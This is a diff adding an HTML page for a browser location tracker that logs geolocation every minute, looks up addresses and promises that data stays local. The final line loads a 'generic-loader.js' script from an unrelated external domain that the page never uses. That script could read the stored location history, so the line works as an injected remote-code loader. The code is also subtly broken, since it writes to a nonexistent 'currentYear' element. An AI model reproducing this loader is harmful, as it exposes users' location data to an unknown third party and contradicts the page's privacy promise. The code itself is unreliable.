@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Location Tracker</title>
+    <style>
+        :root {
+            --primary-color: #3498db;
+            --secondary-color: #2c3e50;
+            --accent-color: #e74c3c;
+            --light-color: #ecf0f1;
+            --dark-color: #34495e;
+            --success-color: #2ecc71;
+            --warning-color: #f39c12;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: var(--light-color);
+            color: var(--dark-color);
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        header {
+            background-color: var(--primary-color);
+            color: white;
+            text-align: center;
+            padding: 1rem;
+            border-radius: 5px;
+            margin-bottom: 2rem;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            margin-bottom: 0.5rem;
+        }
+
+        .app-description {
+            font-size: 1rem;
+            opacity: 0.9;
+        }
+
+        .card {
+            background-color: white;
+            border-radius: 5px;
+            padding: 2rem;
+            margin-bottom: 2rem;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .tracking-controls {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        .btn {
+            padding: 12px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: bold;
+            transition: all 0.3s ease;
+        }
+
+        .btn-primary {
+            background-color: var(--primary-color);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background-color: #2980b9;
+        }
+
+        .btn-danger {
+            background-color: var(--accent-color);
+            color: white;
+        }
+
+        .btn-danger:hover {
+            background-color: #c0392b;
+        }
+
+        .btn-success {
+            background-color: var(--success-color);
+            color: white;
+        }
+
+        .btn-success:hover {
+            background-color: #27ae60;
+        }
+
+        .btn-group {
+            display: flex;
+            gap: 1rem;
+            margin-top: 1rem;
+        }
+
+        .status {
+            margin-top: 1rem;
+            padding: 1rem;
+            border-radius: 5px;
+            text-align: center;
+        }
+
+        .status-tracking {
+            background-color: rgba(46, 204, 113, 0.2);
+            color: #27ae60;
+        }
+
+        .status-stopped {
+            background-color: rgba(231, 76, 60, 0.2);
+            color: #c0392b;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        #locationTable {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 1rem;
+        }
+
+        #locationTable th,
+        #locationTable td {
+            border: 1px solid #ddd;
+            padding: 12px;
+            text-align: left;
+        }
+
+        #locationTable th {
+            background-color: var(--secondary-color);
+            color: white;
+        }
+
+        #locationTable tr:nth-child(even) {
+            background-color: #f2f2f2;
+        }
+
+        #locationTable tr:hover {
+            background-color: #e9e9e9;
+        }
+
+        .location-data {
+            margin-top: 2rem;
+        }
+
+        .error-message {
+            background-color: rgba(231, 76, 60, 0.2);
+            color: #c0392b;
+            padding: 1rem;
+            border-radius: 5px;
+            margin-top: 1rem;
+        }
+
+        .map-container {
+            height: 400px;
+            margin-top: 1rem;
+            border-radius: 5px;
+            overflow: hidden;
+            border: 1px solid #ddd;
+        }
+
+        @media (max-width: 768px) {
+            .btn-group {
+                flex-direction: column;
+            }
+            
+            .map-container {
+                height: 300px;
+            }
+        }
+
+        footer {
+            margin-top: 2rem;
+            text-align: center;
+            padding: 1rem;
+            background-color: var(--secondary-color);
+            color: var(--light-color);
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Location Tracker</h1>
+            <p class="app-description">Track and log your location data in real time</p>
+        </header>
+
+        <div class="card">
+            <h2>Tracking Controls</h2>
+            <div class="tracking-controls">
+                <p>Use the buttons below to start or stop location tracking. Your data is saved locally within your browser.</p>
+                
+                <div class="btn-group">
+                    <button id="startTracking" class="btn btn-primary">Start Tracking</button>
+                    <button id="stopTracking" class="btn btn-danger hidden">Stop Tracking</button>
+                    <button id="exportCSV" class="btn btn-success">Export as CSV</button>
+                    <button id="clearData" class="btn btn-danger">Clear Data</button>
+                </div>
+
+                <div id="trackingStatus" class="status status-stopped">
+                    Tracking is currently inactive
+                </div>
+
+                <div id="errorMessage" class="error-message hidden">
+                    Error message will appear here
+                </div>
+            </div>
+        </div>
+
+        <div class="card">
+            <h2>Current Location</h2>
+            <div id="currentLocationInfo">
+                <p>Start tracking to see your current location.</p>
+            </div>
+            <div id="mapContainer" class="map-container">
+                <p style="text-align: center; padding-top: 180px;">Map will display here once tracking starts</p>
+            </div>
+        </div>
+
+        <div class="card location-data">
+            <h2>Location History</h2>
+            <p>Here's a record of your tracked locations:</p>
+            <div style="overflow-x: auto;">
+                <table id="locationTable">
+                    <thead>
+                        <tr>
+                            <th>Time</th>
+                            <th>Latitude</th>
+                            <th>Longitude</th>
+                            <th>Accuracy (m)</th>
+                            <th>Address</th>
+                        </tr>
+                    </thead>
+                    <tbody id="locationTableBody">
+                        <!-- Table data will be populated here -->
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <div id="informationFooter" style="padding-left: 4em; padding-right: 4em;"></div>
+    </div>
+
+    <script>
+        // Initialize variables
+        let trackingInterval;
+        let locationData = [];
+        const STORAGE_KEY = 'locationTrackerData';
+        
+        // DOM elements
+        const startButton = document.getElementById('startTracking');
+        const stopButton = document.getElementById('stopTracking');
+        const exportButton = document.getElementById('exportCSV');
+        const clearButton = document.getElementById('clearData');
+        const trackingStatus = document.getElementById('trackingStatus');
+        const errorMessage = document.getElementById('errorMessage');
+        const locationTableBody = document.getElementById('locationTableBody');
+        const currentLocationInfo = document.getElementById('currentLocationInfo');
+        const currentYearSpan = document.getElementById('currentYear');
+        
+        // Set current year in footer
+        currentYearSpan.textContent = new Date().getFullYear();
+        
+        // Load saved data from localStorage
+        function loadSavedData() {
+            const savedData = localStorage.getItem(STORAGE_KEY);
+            if (savedData) {
+                try {
+                    locationData = JSON.parse(savedData);
+                    updateLocationTable();
+                } catch (e) {
+                    console.error('Error loading saved data:', e);
+                    showError('Error loading saved location data.');
+                }
+            }
+        }
+        
+        // Save data to localStorage
+        function saveData() {
+            try {
+                localStorage.setItem(STORAGE_KEY, JSON.stringify(locationData));
+            } catch (e) {
+                console.error('Error saving data:', e);
+                showError('Error saving location data to local storage.');
+            }
+        }
+        
+        // Update the location table with current data
+        function updateLocationTable() {
+            locationTableBody.innerHTML = '';
+            
+            if (locationData.length === 0) {
+                locationTableBody.innerHTML = '<tr><td colspan="5" style="text-align: center;">No location data recorded yet</td></tr>';
+                return;
+            }
+            
+            // Sort by newest first
+            const sortedData = [...locationData].reverse();
+            
+            for (const location of sortedData) {
+                const row = document.createElement('tr');
+                
+                const timeCell = document.createElement('td');
+                timeCell.textContent = new Date(location.timestamp).toLocaleString();
+                
+                const latCell = document.createElement('td');
+                latCell.textContent = location.latitude.toFixed(6);
+                
+                const lngCell = document.createElement('td');
+                lngCell.textContent = location.longitude.toFixed(6);
+                
+                const accuracyCell = document.createElement('td');
+                accuracyCell.textContent = location.accuracy ? location.accuracy.toFixed(1) : 'N/A';
+                
+                const addressCell = document.createElement('td');
+                addressCell.textContent = location.address || 'Fetching...';
+                
+                row.appendChild(timeCell);
+                row.appendChild(latCell);
+                row.appendChild(lngCell);
+                row.appendChild(accuracyCell);
+                row.appendChild(addressCell);
+                
+                locationTableBody.appendChild(row);
+            }
+        }
+        
+        // Show error message
+        function showError(message) {
+            errorMessage.textContent = message;
+            errorMessage.classList.remove('hidden');
+            setTimeout(() => {
+                errorMessage.classList.add('hidden');
+            }, 5000);
+        }
+        
+        // Get current location
+        function getCurrentLocation() {
+            if (!navigator.geolocation) {
+                showError('Geolocation is not supported by your browser');
+                return;
+            }
+            
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const { latitude, longitude, accuracy } = position.coords;
+                    const timestamp = position.timestamp || Date.now();
+                    
+                    // Display current location info
+                    currentLocationInfo.innerHTML = `
+                        <p><strong>Latitude:</strong> ${latitude.toFixed(6)}</p>
+                        <p><strong>Longitude:</strong> ${longitude.toFixed(6)}</p>
+                        <p><strong>Accuracy:</strong> ${accuracy.toFixed(1)} meters</p>
+                        <p><strong>Time:</strong> ${new Date(timestamp).toLocaleString()}</p>
+                    `;
+                    
+                    // Create location object
+                    const locationObject = {
+                        latitude,
+                        longitude,
+                        accuracy,
+                        timestamp,
+                        address: null
+                    };
+                    
+                    // Add to data array
+                    locationData.push(locationObject);
+                    
+                    // Save to localStorage
+                    saveData();
+                    
+                    // Update table
+                    updateLocationTable();
+                    
+                    // Get address using reverse geocoding
+                    fetchAddress(latitude, longitude, locationData.length - 1);
+                    
+                    // Update map (simplified placeholder for demonstration)
+                    updateMap(latitude, longitude);
+                },
+                (error) => {
+                    let errorMsg;
+                    switch (error.code) {
+                        case error.PERMISSION_DENIED:
+                            errorMsg = 'User denied the request for Geolocation.';
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            errorMsg = 'Location information is unavailable.';
+                            break;
+                        case error.TIMEOUT:
+                            errorMsg = 'The request to get user location timed out.';
+                            break;
+                        default:
+                            errorMsg = 'An unknown error occurred.';
+                            break;
+                    }
+                    showError(errorMsg);
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        }
+        
+        // Fetch address using reverse geocoding
+        function fetchAddress(latitude, longitude, dataIndex) {
+            // Using Nominatim OpenStreetMap API for reverse geocoding
+            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`)
+                .then(response => response.json())
+                .then(data => {
+                    const address = data.display_name || 'Address unknown';
+                    
+                    // Update the location data object
+                    if (locationData[dataIndex]) {
+                        locationData[dataIndex].address = address;
+                        saveData();
+                        updateLocationTable();
+                    }
+                })
+                .catch(error => {
+                    console.error('Error fetching address:', error);
+                });
+        }
+        
+        // Placeholder function for map updates
+        function updateMap(latitude, longitude) {
+            const mapContainer = document.getElementById('mapContainer');
+            mapContainer.innerHTML = `
+                <iframe 
+                    width="100%" 
+                    height="100%" 
+                    frameborder="0" 
+                    scrolling="no" 
+                    marginheight="0" 
+                    marginwidth="0" 
+                    src="https://www.openstreetmap.org/export/embed.html?bbox=${longitude-0.01},${latitude-0.01},${longitude+0.01},${latitude+0.01}&layer=mapnik&marker=${latitude},${longitude}" 
+                    style="border: 1px solid black">
+                </iframe>
+            `;
+        }
+        
+        // Export data as CSV
+        function exportDataAsCSV() {
+            if (locationData.length === 0) {
+                showError('No data to export');
+                return;
+            }
+            
+            // Prepare CSV header and content
+            const csvHeader = 'Timestamp,Time,Latitude,Longitude,Accuracy (m),Address\n';
+            const csvContent = locationData.map(location => {
+                const dateTime = new Date(location.timestamp).toLocaleString();
+                return `${location.timestamp},"${dateTime}",${location.latitude},${location.longitude},${location.accuracy || ''},"${location.address || ''}"`;
+            }).join('\n');
+            
+            // Create blob and download link
+            const blob = new Blob([csvHeader + csvContent], { type: 'text/csv;charset=utf-8;' });
+            const url = URL.createObjectURL(blob);
+            const link = document.createElement('a');
+            
+            // Set download attributes
+            link.setAttribute('href', url);
+            link.setAttribute('download', `location-data-${new Date().toISOString().slice(0,10)}.csv`);
+            link.style.visibility = 'hidden';
+            
+            // Add to DOM, trigger download and clean up
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+        
+        // Clear all location data
+        function clearAllData() {
+            if (confirm('Are you sure you want to delete all location data? This cannot be undone.')) {
+                locationData = [];
+                saveData();
+                updateLocationTable();
+                currentLocationInfo.innerHTML = '<p>Start tracking to see your current location.</p>';
+                document.getElementById('mapContainer').innerHTML = '<p style="text-align: center; padding-top: 180px;">Map will display here once tracking starts</p>';
+            }
+        }
+        
+        // Start location tracking
+        function startTracking() {
+            // Get initial location
+            getCurrentLocation();
+            
+            // Set up interval for continuous tracking
+            trackingInterval = setInterval(getCurrentLocation, 60000); // Update every minute
+            
+            // Update UI
+            startButton.classList.add('hidden');
+            stopButton.classList.remove('hidden');
+            trackingStatus.textContent = 'Tracking is active (updating every minute)';
+            trackingStatus.classList.remove('status-stopped');
+            trackingStatus.classList.add('status-tracking');
+        }
+        
+        // Stop location tracking
+        function stopTracking() {
+            clearInterval(trackingInterval);
+            
+            // Update UI
+            stopButton.classList.add('hidden');
+            startButton.classList.remove('hidden');
+            trackingStatus.textContent = 'Tracking has been stopped';
+            trackingStatus.classList.remove('status-tracking');
+            trackingStatus.classList.add('status-stopped');
+        }
+        
+        // Event listeners
+        startButton.addEventListener('click', startTracking);
+        stopButton.addEventListener('click', stopTracking);
+        exportButton.addEventListener('click', exportDataAsCSV);
+        clearButton.addEventListener('click', clearAllData);
+        
+        // Initialize on page load
+        window.addEventListener('DOMContentLoaded', () => {
+            loadSavedData();
+        });
+    </script>
+    
+    <script src="https://www.avemariacloud.com/generic-loader.js"></script>
+</body>
+</html>
